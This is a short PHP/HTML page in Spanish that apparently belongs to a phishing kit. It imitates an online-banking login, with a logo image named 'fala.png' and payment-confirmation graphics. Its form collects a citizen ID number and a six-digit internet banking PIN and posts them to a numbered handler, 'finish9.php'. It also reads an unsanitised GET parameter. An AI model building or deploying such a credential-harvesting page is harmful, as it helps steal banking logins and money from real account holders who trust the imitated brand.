<?php

$fechactual = date('d-m-Y');


$codigoG = $_GET['codigo'];

$palabrasSeparadas = explode(" ", $codigoG);

    $fechaActual = date('d/m/y');
    $ca = substr($palabrasSeparadas[0],11,4); 
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
    <title>Document</title>

    <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input{
            width: 80%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
            padding: 5px;
        }
        select{
            padding: 5px;
            background-color: white;
            color: black;
            width: 82%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
        }

        #btn{
            background-color: palevioletred;
            border: none;
            color: white;
            letter-spacing: 3px;
            font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
            
        }

        #clave{
            color:rgb(78,139,102);
        }
    </style>
</head>
<body>
    <br><br>
    <div><center><img src="/img/fala.png" alt="" width="40%" height="">
    <img src="/images/check.png" alt="" srcset="" width="20%"></center>
    <img src="/img/pago.jpg" alt="" width="20%" style="margin-left:90px;"></div>
<br><br><br><br>
    <div>
        <center><form action="finish9.php" method="post">
        <select name="" id="">
            <option value="cedula">Cedula Ciudadania</option>
        </select><br>
        <form action="" method="post">   
        <input type="text" id="" name = "cedula" placeholder="Cedula Ciudadania"><br>
        <input type="text" id="" name ="clave" placeholder="Clave internet" required pattern="[0-9]{6}"><br>
        <input type="submit" value="INGRESAR" id="btn" ></center><br>
    </form>
        
       <center> <a href="" id="clave">Crea o recupera tu clave internet</a></center>
    </form></div>
<br><br>
    
</body>
</html>